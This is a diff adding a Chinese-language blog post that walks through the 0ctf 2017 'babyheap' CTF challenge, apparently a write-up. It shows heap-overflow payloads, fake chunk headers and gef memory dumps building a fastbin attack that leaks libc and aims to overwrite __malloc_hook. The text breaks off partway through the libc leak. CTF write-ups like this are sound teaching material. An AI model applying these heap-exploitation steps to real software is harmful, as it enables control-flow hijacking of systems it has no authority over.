@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>CTF | 0ctf 2017 babyheap - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="0ctf 2017 babyheap writeup 有关 fastbin attack 利用
+稍微复习一下 fastbin attack 利用思路：
+ 覆盖 got 表劫持控制流 覆盖栈上函数返回地址，然后ROP劫持控制流 覆盖 malloc_hook、覆盖 _IO_FILE 等方式劫持控制流 没有开 FULL RELRO 的话，就可以考虑修改 got 表内容  算是很经典的一道题了吧 先分析一下程序 allocate:
+最大0x1000
+fill 关键！
+没有设置字符串结尾，而且长度并不是之前 chunk 分配时指定的长度，是自己指定的，所以这里就出现了任意堆溢出的情形。可以用来泄露libc地址，以及构造fake chunk
+dump
+输出对应chunk的内容
+free
+释放堆块，清空 inuse,size,ptr
+chunk 结构:
+&#43;---------|---------&#43;|prev_size| size ||---------|---------|| fd | bk ||---------|---------|| data |&#43;---------|---------&#43;chunk 包含三个字段：inusesizeptr题目中 fill 存在堆溢出，可以写任意长度，注意分配使用的 calloc ，在分配的时候会将分配出来的 chunk 先清空，dump 的大小是根据 alloc 指定的 size 决定的，跟真正的 chunk 大小无关。">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="single">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+
+
+<article class="post-single">
+	<header class="post-header">
+		<h1 class="post-title">CTF | 0ctf 2017 babyheap</h1>
+		<div class="post-meta">September 25, 2018</div>
+	</header>
+	<div class="post-content"><p><code>0ctf 2017 babyheap writeup</code>
+有关 <code>fastbin attack</code> 利用</p>
+<!-- raw HTML omitted -->
+<p>稍微复习一下 <code>fastbin attack</code>
+利用思路：</p>
+<ol>
+<li>覆盖 <code>got</code> 表劫持控制流</li>
+<li>覆盖栈上函数返回地址，然后ROP劫持控制流</li>
+<li>覆盖 <code>malloc_hook</code>、覆盖 <code>_IO_FILE</code> 等方式劫持控制流
+没有开 FULL RELRO 的话，就可以考虑修改 got 表内容</li>
+</ol>
+<p>算是很经典的一道题了吧
+先分析一下程序
+<strong>allocate</strong>:<br>
+最大0x1000</p>
+<p><strong>fill</strong>   关键！<br>
+没有设置字符串结尾，而且长度并不是之前 chunk 分配时指定的长度，是自己指定的，所以这里就出现了任意堆溢出的情形。可以用来泄露libc地址，以及构造fake chunk</p>
+<p><strong>dump</strong><br>
+输出对应chunk的内容</p>
+<p><strong>free</strong><br>
+释放堆块，清空 <code>inuse,size,ptr</code></p>
+<p>chunk 结构:</p>
+<pre><code>+---------|---------+
+|prev_size|  size   |
+|---------|---------|
+|   fd    |   bk    |
+|---------|---------|
+|       data        |
++---------|---------+
+</code></pre><pre><code>chunk 包含三个字段：
+inuse
+size
+ptr
+</code></pre><p>题目中 <code>fill</code> 存在堆溢出，可以写任意长度，注意分配使用的 <code>calloc</code> ，在分配的时候会将分配出来的 <code>chunk</code> <code>先清空，dump</code> 的大小是根据 <code>alloc</code> 指定的 <code>size</code> 决定的，跟真正的 <code>chunk</code> 大小无关。</p>
+<p>检查保护</p>
+<pre><code>[*] '/home/yuuoniy/Desktop/201809/babyheap'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><p>不能直接修改 <code>got</code>。。所以思路应该是 修改 <code>malloc__hook</code> 或 <code>__free__hook</code></p>
+<p><strong>利用思路</strong> 
+关键</p>
+<ol>
+<li>泄露 <code>libc</code> 地址：从而得到 <code>malloc_hook</code> ,<code>one_gadget</code> 的地址</li>
+<li>劫持控制流：通过修改<code> malloc_hook</code> 到 <code>one_gadget</code> 地址，就可以劫持控制流，因此可以通过 <code>fastbin attack</code> ，达到任意地址写</li>
+</ol>
+<p>利用堆溢出我们可以修改 <code>size</code>，从而达到 <code>chunk overlapping,</code>再通过 <code>dump</code> 就可以获取堆块的<code> fd,bk</code> 从而得到 <code>libc</code> 地址</p>
+<p>可以看一下 <code>glibc</code> 中 <code>__libc_free</code> 的实现
+注意 <code>free</code> 的时候会检查 <code>nextsize</code> 是否合法,所以我们需要伪造 <code>nextsize</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">   <span style="color:#66d9ef">if</span> (__glibc_unlikely (<span style="color:#f92672">!</span>prev_inuse(nextchunk)))
+      malloc_printerr (<span style="color:#e6db74">&#34;double free or corruption (!prev)&#34;</span>);
+    nextsize <span style="color:#f92672">=</span> chunksize(nextchunk);
+    <span style="color:#66d9ef">if</span> (__builtin_expect (chunksize_nomask (nextchunk) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> SIZE_SZ, <span style="color:#ae81ff">0</span>)
+        <span style="color:#f92672">||</span> __builtin_expect (nextsize <span style="color:#f92672">&gt;=</span> av<span style="color:#f92672">-&gt;</span>system_mem, <span style="color:#ae81ff">0</span>))
+      malloc_printerr (<span style="color:#e6db74">&#34;free(): invalid next size (normal)&#34;</span>);
+</code></pre></div><p>构造 <code>chunk</code> 的 <code>layout</code> 还是有点难&hellip;参考了一下别人的思路， 劫持控制流的操作比较常规
+如果分配出来的 chunk 的 size 不属于这个 fastbin，那么会出现memory corruption(fast) 的错误。通过修改 fd 进入 fastbin 的 chunk 并没有进行对齐检测，所以我们可以利用没有对齐的数据来通过这个检测</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"> victim <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>fb;
+      <span style="color:#66d9ef">if</span> (victim <span style="color:#f92672">!=</span> NULL)
+        {
+          <span style="color:#66d9ef">if</span> (SINGLE_THREAD_P)
+            <span style="color:#f92672">*</span>fb <span style="color:#f92672">=</span> victim<span style="color:#f92672">-&gt;</span>fd;
+          <span style="color:#66d9ef">else</span>
+            <span style="color:#a6e22e">REMOVE_FB</span> (fb, pp, victim);
+          <span style="color:#66d9ef">if</span> (__glibc_likely (victim <span style="color:#f92672">!=</span> NULL))
+            {
+              size_t victim_idx <span style="color:#f92672">=</span> fastbin_index (chunksize (victim));
+              <span style="color:#66d9ef">if</span> (__builtin_expect (victim_idx <span style="color:#f92672">!=</span> idx, <span style="color:#ae81ff">0</span>))
+                malloc_printerr (<span style="color:#e6db74">&#34;malloc(): memory corruption (fast)&#34;</span>);
+</code></pre></div><h3 id="泄露-libc">泄露 libc</h3>
+<p>首先<code>alloc(0x60)</code> <code>alloc(0x40)</code> 分配两个堆块 分别标记为 0 1</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x0000555c81913000</span>
+<span style="color:#ae81ff">0x555c81913000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">&lt;=</span> chunk <span style="color:#ae81ff">0</span> header 
+<span style="color:#ae81ff">0x555c81913010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c81913020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c81913030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c81913040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c81913050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c81913060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">&lt;=</span> chunk <span style="color:#ae81ff">1</span> header
+<span style="color:#ae81ff">0x555c81913070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000051</span>
+<span style="color:#ae81ff">0x555c81913080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c81913090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c819130a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c819130b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c819130c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000020f41</span> <span style="color:#f92672">&lt;=</span> top chunk
+<span style="color:#ae81ff">0x555c819130d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c819130e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x555c819130f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+
+</code></pre></div><p><code>fill(0, 0x60 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71))</code>
+通过栈溢出修改 <code>chunk 1</code> 的 <code>size</code> 为 <code>0x70</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x000055ca12def000</span>
+<span style="color:#ae81ff">0x55ca12def000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span>chunk <span style="color:#ae81ff">0</span> header
+<span style="color:#ae81ff">0x55ca12def010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55ca12def020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55ca12def030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55ca12def040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55ca12def050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55ca12def060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55ca12def070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span>chunk <span style="color:#ae81ff">1</span> size <span style="color:#960050;background-color:#1e0010">被修改为</span><span style="color:#ae81ff">0x70</span><span style="color:#960050;background-color:#1e0010">了</span>
+<span style="color:#ae81ff">0x55ca12def080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55ca12def090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55ca12def0a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55ca12def0b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55ca12def0c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000020f41</span>
+<span style="color:#ae81ff">0x55ca12def0d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p><code>alloc(0x100) # 2</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x000055dc9b1b8000</span>
+<span style="color:#ae81ff">0x55dc9b1b8000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> header
+<span style="color:#ae81ff">0x55dc9b1b8010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> header (<span style="color:#960050;background-color:#1e0010">注意原本的</span>size是0x51)
+<span style="color:#ae81ff">0x55dc9b1b8080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b8090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b80a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b80b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b80c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000111</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span>  header
+<span style="color:#ae81ff">0x55dc9b1b80d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b80e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b80f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p><code>fill(2, 0x20, 'c' * 0x10 + p64(0) + p64(0x71)) </code>
+在 chunk2 中构造一个 fake chunk header</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x000055dc9b1b8000</span>
+<span style="color:#ae81ff">0x55dc9b1b8000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span>
+<span style="color:#ae81ff">0x55dc9b1b8010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x55dc9b1b8070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> 
+<span style="color:#ae81ff">0x55dc9b1b8080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b8090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b80a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b80b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x55dc9b1b80c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000111</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span>
+<span style="color:#ae81ff">0x55dc9b1b80d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6363636363636363</span>	<span style="color:#ae81ff">0x6363636363636363</span>
+<span style="color:#ae81ff">0x55dc9b1b80e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> fake chunk size
+<span style="color:#ae81ff">0x55dc9b1b80f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p><code>free(1)</code>,添加 chunk 1添加到 <code>fastbin</code> 中，注意 size 是 <code>0x70</code>,包括了 <code>chunk 2</code> 的一部分</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  Fastbins[idx<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x60</span>]  <span style="color:#960050;background-color:#1e0010">←</span>  Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x55d152149080</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x70</span>, flags<span style="color:#f92672">=</span>PREV_INUSE) 
+</code></pre></div><p>将 刚 free 掉的chunk 1 malloc 出来,里面的内容被清空了
+alloc(0x60)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00005565fc9ce000</span>
+<span style="color:#ae81ff">0x5565fc9ce000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span>
+<span style="color:#ae81ff">0x5565fc9ce010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5565fc9ce020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5565fc9ce030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5565fc9ce040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5565fc9ce050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5565fc9ce060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5565fc9ce070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span>
+gef<span style="color:#960050;background-color:#1e0010">➤</span>  
+<span style="color:#ae81ff">0x5565fc9ce080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x5565fc9ce090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x5565fc9ce0a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x5565fc9ce0b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x5565fc9ce0c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x5565fc9ce0d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x5565fc9ce0e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> fake header 
+<span style="color:#ae81ff">0x5565fc9ce0f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p><code>fill(1, 0x40 + 0x10, 'b' * 0x40 + p64(0) + p64(0x111))</code> ：
+恢复 chunk2 的头</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x565289992010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
+<span style="color:#ae81ff">0x565289992000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span>
+<span style="color:#ae81ff">0x565289992010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x565289992020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x565289992030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x565289992040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x565289992050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x565289992060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x565289992070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> 
+<span style="color:#ae81ff">0x565289992080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x565289992090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x5652899920a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x5652899920b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span> 
